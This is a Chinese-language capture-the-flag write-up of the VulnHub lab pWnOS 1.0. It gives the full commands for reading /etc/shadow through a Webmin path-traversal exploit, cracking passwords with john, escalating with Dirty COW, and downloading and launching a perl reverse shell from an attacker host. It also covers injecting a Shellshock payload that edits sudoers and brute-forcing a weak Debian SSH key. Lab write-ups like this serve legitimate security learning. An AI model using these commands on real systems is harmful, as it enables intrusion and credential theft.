---
title: pWnOS-1.0
author: Creexile
date: 2025-03-12 11:47:54
lastMod: 2025-03-12
summary: 'easyNo.14,新的getshell方式'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [漏洞利用, 爆破, 私钥碰撞, 渗透]
---

# pWnOS-1.0

---

> 来源: [vulnhub靶场-pWnOS: 1.0](https://www.vulnhub.com/entry/pwnos-10,33/)
>
> 目标: 我觉得是获取root权限
>
> 提示: If Vmware asks whether you copied or moved this virtual machine on first boot, click MOVED! Otherwise the network settings could get messed up.
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

- kali: 192.168.110.130
- target: 192.168.110.128

## 信息收集

nmap

```bash
# 获取靶机地址 192.168.110.128
sudo nmap -sn 192.168.110.0/24
# 获取端口信息 22,80,139,445,10000
sudo nmap -sT --min-rate 10000 -p- 192.168.110.128 -oA scan/ports
# 获取详细信息
sudo nmap -sT -sV -sC -O -p22,80,139,445,10000 192.168.110.128 -oA scan/detail
# 看看漏洞
sudo nmap --script=vuln -p22,80,139,445,10000 192.168.110.128 -oA scan/vuln
```

139和445提供了 Samba smbd 3.3.26a 服务, 10000则提供了MiniServ 0.01服务

1. 系统的内核比较旧, 可能可以用脏牛提权
2. 经过漏洞扫描, 似乎有一个`CVE-2006-3392`的文件泄露

### 80/http

先来目录扫描扫一下

```
/index2
/index2.php
/php
```

在php目录下找到文件夹phpMyAdmin, 我们并没有发现这个服务, 而且进入该文件夹需要密码, 放在一边

### 139/445

sabmap扫描发现没法利用, 那就扔在一边了

### 10000/http

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312164820.png)

看起来像是一个cms, 搜索关键词Webmin找一些漏洞利用脚本来用

找到了一个`CVE-2019-15107`的漏洞利用脚本[github地址](https://github.com/MuirlandOracle/CVE-2019-15107/blob/main/CVE-2019-15107.py), 运行说版本过低不能利用, 似乎是0.01版本?直接贴图吧

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312170730.png)

所以我们要找一些非常老的漏洞?看看漏洞库有没有那种很老的吧

```bash
searchsploit webmin
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312171852.png)

这三个中, php是要apache环境, ruby是要放在msf框架中, 而pl文件比较好使用, 就用你了

> 其实是都试过发现要么报错要么麻烦; 而且如果你看过这个`2017.pl`, 你会发现里面的payload似乎就是nmap扫描出来的那个漏洞, 用`%01`绕过`../`限制的那个

```bash
# 获取帮助
perl 2017.pl
# 尝试获取信息
perl 2017.pl 192.168.110.128 10000 /etc/passwd 0
# 获取加密过的密码
perl 2017.pl 192.168.110.128 10000 /etc/shadow 0
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312172924.png)

利用john对密码进行爆破, 得到`vmware:h4ckm3`

```bash
sudo john usrhash --wordlist=/usr/share/wordlists/rockyou.txt
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312173423.png)

## getshell

对`shadow`的爆破可以直接利用ssh获取shell, 但是不排除有密码复用的情况用于登录其他地方, 这里就不赘述了, 直接登录获取shell

> 报错Unable to negotiate with 192.168.110.128 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss, 那就加上它想要的参数就行

```bash
ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss vmware@192.168.110.128
```

## 信息收集

```bash
# 系统信息 Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
uname -a
# 内核版本 2.6.22-14-server
uname -r
# 查看发行版的信息 Ubuntu 7.10
lsb_release -a
# 查看环境
python -h
nc -h
gcc -v
# 查看权限, 无
sudo -l
# 查看特权文件, 无发现
find / -perm -u=s -type f 2>/dev/null
# 看看计划任务, 无发现
cat /etc/crontab
```

本来想看看webmin的配置文件藏了什么的, 结果访问`/var/webmin`的时候说我权限不足, 看了一眼发现是root权限的

现在可能就是看看能不能利用webmin的文件包含给我们反弹一个shell来获取root权限

## 提权

### dirty cow

脏牛漏洞提权可以用`linux/local/40839.c`, 靶机中有gcc环境; 如果报错你可以在代码的最后手动加上一个空格, 也不知道为什么这么报错

编译方式如下, 切换为firefart用户即可拿到root权限

```bash
gcc -pthread 40839.c -o dirty -lcrypt
```

### 反弹shell

尝试包含php文件, 奇怪, 似乎直接返回了源码而没有被执行

看大佬的博客, 用的是perl的反弹马, 且将后缀改为了cgi再包含才被成功执行

> 尝试登录cms的时候网址不是`session_login.cgi`吗, 可能就是从这里来的

```bash
# kali
cp /usr/share/webshells/perl/perl-reverse-shell.pl shell.cgi
python3 -m http.server 8888
# target
wget http://192.168.110.130:8888/shell.cgi
# kali
nc -lvnp 6666
perl 2017.pl 192.168.110.128 10000 /home/vmware/shell.cgi 0
```

如果你之前用了脏牛, 获取反弹shell后输入whoami应该是firefart

### shellshock

bash版本小于4.3, 一般会存在shellshock漏洞. 网上可以找到比较多的验证语句, 随便拿一个就行

```bash
# GNU bash, version 3.2.25(1)-release (i486-pc-linux-gnu)
bash --version
# 测试语句, 成功输出 It is vulnerable
env x='() { :; }; echo "It is vulnerable"' bash -c date
```

结合前面的`2017.pl`的payload, 系统可执行文件为cgi文件, 已知的账密`vmware:h4ckm3`进行利用

> obama我们没有密码, 后面就算赋予了sudo权限我们照样利用不了, 所以需要一个已知的账密

首先创建恶意文件准备被包含

```bash
# target
echo "#!/bin/bash" >> shell.cgi
chmod +x shell.cgi
```

首先利用shellshock赋予vmware用户sudo权限, 这时候执行`sudo -l`应该是ALL=(ALL)ALL

```bash
curl http://192.168.110.128:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/halo.cgi -A '() { :; }; /bin/echo "vmware ALL=(ALL)ALL" >> /etc/sudoers'
```

随后就是sudo提权

```bash
sudo /bin/bash
```

## 附录

### 临时服务器

除了用python开启一个临时服务器, 还可以用php:

```bash
php -S 0:80
```

### 公钥破解getshell

服务器管理员登录可能会使用ssh密钥登录, 这个密钥一般在`.ssh/authorized_keys`文件中

还记得前面webmin是root权限么, 我们用它来读取公钥文件

```bash
perl 2017.pl 192.168.110.128 10000 /home/vmware/.ssh/authorized_keys 0
```

拿到公钥之后需要用自己的私钥进行碰撞, 利用伪随机数生成器尝试爆破

> prng：pseudo random number generator（伪随机数生成器）

```bash
searchsploit prng
# 选择和OpenSSL相关的
cp /usr/share/exploitdb/exploits/linux/remote/5622.txt 5622.txt
```

简单翻译一下

1. 下载文件
2. 将其提取到一个目录
3. 在 /root/.ssh/authorized_keys 中输入一个 2048 位的 SSH RSA 密钥，该密钥是在一个没有修补的 Debian 系统上生成的（这是这个漏洞将破坏的密钥）
4. 运行 Perl 脚本，并提供你提取 bzip2 文件的位置

听不太懂在说什么, 反正就是个库用于碰撞的

```bash
tar vjxf 5622.tar.bz2
```

解压完, 多了一个叫做rsa的目录; 这个目录下有很多名称一样文件对, 分别是公钥和私钥, 扩展名带有.pub的是公钥

我们直接用grep进行搜索内容即可, 仅匹配部分, 然后再找出来匹配全部不就好了

```bash
grep -lr 'AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx'
```

> -l: 会输出包含匹配字符串的文件名
> -r: 搜索指定目录中的所有文件及其子目录

找不到就换一个用户继续进行搜索, 这里找到了obama用户的公钥和一个文件的内容完全一样

```bash
perl 2017.pl 192.168.110.128 10000 /home/obama/.ssh/authorized_keys 0
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312191801.png)

将对应的私钥拿走, 在工作目录中利用其进行登录

```bash
cp dcbe2a56e8cdea6d17495f6648329ee2-4679 ../../
ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss -idcbe2a56e8cdea6d17495f6648329ee2-4679 obama@192.168.110.128
```

给定了私钥但是还是向我们要密码, 奇怪了. 这时候可以添加参数`-vv`来看看是哪里出现了问题

```bash
sign_and_send_pubkey: no mutual signature supported
# 客户端和服务器之间没有共同支持的签名算法来进行公钥认证
```

那就给一个相同的pubkey, 成功拿到shell

```bash
ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss -idcbe2a56e8cdea6d17495f6648329ee2-4679 -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss obama@192.168.110.128
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312192815.png)
